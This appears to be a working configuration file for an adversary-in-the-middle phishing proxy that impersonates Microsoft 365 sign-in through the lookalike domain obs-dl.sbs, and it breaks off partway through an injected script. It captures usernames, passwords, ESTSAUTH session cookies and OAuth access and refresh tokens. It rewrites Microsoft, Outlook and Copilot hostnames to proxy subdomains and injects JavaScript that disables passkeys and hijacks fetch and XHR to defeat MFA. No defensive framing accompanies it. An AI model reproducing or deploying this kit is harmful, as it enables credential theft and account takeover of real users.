version: "0.0"



global:
  impersonate:
    enabled: true
    retain_ua: true
  access:
    mode: "public"
    on_deny: "https://microsoft.com"



# ============================================================
# login.microsoftonline.com → obs-dl.sbs (ROOT DOMAIN)
# This is the entry point for OAuth2 authentication.
# MSAL.js discovery calls go to obs-dl.sbs (same domain = through proxy)
# so the proxy can fix authorization_endpoint automatically.
# ============================================================
login.microsoftonline.com:
  to: "obs-dl.sbs"
  capture:
    - name: "username"
      method: "POST"
      path: "/common/GetCredentialType"
      engine: "json"
      find: "username"
      from: "request_body"

    - name: "password"
      method: "POST"
      path: "/common/login"
      engine: "form"
      find: "passwd"
      from: "request_body"

    - name: "session_token"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "ESTSAUTH"
      from: "cookie"
      required: false

    - name: "session_token_persistent"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "ESTSAUTHPERSISTENT"
      from: "cookie"
      required: false

    - name: "msal_access_token"
      method: "POST"
      path: ".*/oauth2/v2.0/token"
      engine: "json"
      find: "access_token"
      from: "response_body"
      required: false

    - name: "msal_refresh_token"
      method: "POST"
      path: ".*/oauth2/v2.0/token"
      engine: "json"
      find: "refresh_token"
      from: "response_body"
      required: false

  rewrite:
    - name: "rewrite_login_domain"
      find: "login\\.microsoftonline\\.com"
      replace: "obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_login_live"
      find: "login\\.live\\.com"
      replace: "live.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_aadcdn"
      find: "aadcdn\\.msftauth\\.net"
      replace: "aadcdn.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_logincdn"
      find: "logincdn\\.msftauth\\.net"
      replace: "logincdn.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_msauth"
      find: "aadcdn\\.msauth\\.net"
      replace: "msauth.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_office"
      find: "www\\.office\\.com"
      replace: "office.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_loginmicrosoft"
      find: "login\\.microsoft\\.com"
      replace: "loginmicrosoft.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_account_live"
      find: "account\\.live\\.com"
      replace: "account-live.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_m365"
      find: "m365\\.cloud\\.microsoft"
      replace: "m365.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_mssso_copilot_ms"
      find: "ms-sso\\.copilot\\.microsoft\\.com"
      replace: "ms-sso.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_mssso_copilot"
      find: "ms-sso\\.copilot\\.com"
      replace: "ms-sso-c.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_outlook365"
      find: "outlook\\.office365\\.com"
      replace: "outlook.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_outlook_office"
      find: "outlook\\.office\\.com"
      replace: "outlook-office.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_outlook_live"
      find: "outlook\\.live\\.com"
      replace: "outlook-live.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_substrate"
      find: "substrate\\.office\\.com"
      replace: "substrate.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_login_windows"
      find: "login\\.windows\\.net"
      replace: "login-windows.obs-dl.sbs"
      from: "response_body"

    - name: "disable_webauthn"
      find: "(?i)<head>"
      replace: "<head><script>Object.defineProperty(navigator,'credentials',{get:function(){return{get:function(){return Promise.reject(new DOMException('not allowed','NotAllowedError'))},create:function(){return Promise.reject(new DOMException('not allowed','NotAllowedError'))},preventSilentAccess:function(){return Promise.resolve()},store:function(){return Promise.resolve()}}}});Object.defineProperty(window,'PublicKeyCredential',{get:function(){return undefined}});(function(){var P=location.hostname;var D=P.split('.');if(D.length>2){D=D.slice(-2).join('.')}else{D=P}var maps={'outlook.live.com':'outlook-live.'+D,'outlook.office365.com':'outlook.'+D,'outlook.office.com':'outlook-office.'+D,'login.microsoftonline.com':D,'login.live.com':'live.'+D,'login.microsoft.com':'loginmicrosoft.'+D,'login.windows.net':'login-windows.'+D};function fixUrl(u){if(typeof u!=='string')return u;for(var k in maps){if(u.indexOf(k)!==-1){u=u.split('https://'+k).join('https://'+maps[k]).split('http://'+k).join('https://'+maps[k])}}return u}var O=window.fetch;window.fetch=function(i,n){var u=(typeof i==='string')?i:(i&&i.url?i.url:'');if(u.indexOf('discovery/instance')!==-1&&u.indexOf('authorization_endpoint')!==-1){try{var U=new URL(u);var a=U.searchParams.get('authorization_endpoint')||'';if(a.indexOf(D)!==-1){var t=a.match('https?://[^/]+/([^/]+)/');var T=t?t[1]:'organizations';var R={'tenant_discovery_endpoint':'https://'+D+'/'+T+'/v2.0/.well-known/openid-configuration','api-version':'1.1','metadata':[{'preferred_network':D,'preferred_cache':D,'aliases':['login.microsoftonline.com','login.windows.net','login.microsoft.com','sts.windows.net',D]}]};return Promise.resolve(new Response(JSON.stringify(R),{status:200,statusText:'OK',headers:{'Content-Type':'application/json;charset=utf-8'}}))}}catch(e){}}var fu=fixUrl(u);if(fu!==u){if(typeof i==='string'){i=fu}else if(i&&i.url){i=new Request(fu,i)}}return O.call(this,i,n)};var X=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=fun